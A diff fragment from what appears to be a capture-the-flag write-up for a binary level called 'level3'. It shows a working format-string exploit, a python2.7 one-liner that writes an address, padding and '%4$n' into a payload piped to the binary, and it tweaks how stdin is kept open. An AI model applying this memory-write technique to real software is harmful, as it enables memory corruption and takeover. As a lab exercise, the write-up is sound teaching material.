@@ -37,7 +37,7 @@ python2.7 -c 'print("BBBB" + " %4p")'  | ./level3
 # 80484df:       83 f8 40                cmp    eax,0x40
 
 python2.7 -c 'print("\x8c\x98\x04\x08" + "a"*60 + "%4$n")' > /tmp/exploit.txt
-cat /tmp/exploit.txt /dev/stdin | ./level3
+cat /tmp/exploit.txt - | ./level3
 ```
 
 ## flag
